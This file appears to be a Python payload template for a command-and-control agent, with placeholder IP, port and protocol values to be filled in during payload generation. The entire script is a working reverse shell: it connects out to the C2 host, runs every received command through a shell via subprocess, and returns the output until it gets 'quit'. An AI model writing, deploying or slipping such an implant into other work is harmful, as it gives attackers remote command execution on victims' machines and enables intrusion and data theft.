import socket
import subprocess

# Define parameters
IP = "{{IP}}"       # Placeholder for IP address
# Placeholder for port number. This will be replaced during payload generation.
PORT = 0
PORT = {{PORT}}     # Placeholder for port number
PROTOCOL = "{{PROTOCOL}}"  # Placeholder for communication protocol (e.g., TCP, HTTP, HTTPS)

def main():
    # Connect to the C2 server
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((IP, PORT))

    # Main agent loop
    while True:
        # Receive command from C2 server
        command = cs.recv(1024).decode()

        # Check for termination command
        if command == "quit":
            break

        # Execute command and capture output
        output = execute_command(command)

        # Send output back to C2 server
        cs.send(output.encode())

    # Close the socket connection
    cs.close()

def execute_command(command):
    # Execute the command using subprocess and capture output
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = p.communicate()

    # Check for errors and return output
    if stderr:
        return stderr.decode()
    else:
        return stdout.decode()

if __name__ == "__main__":
    main()
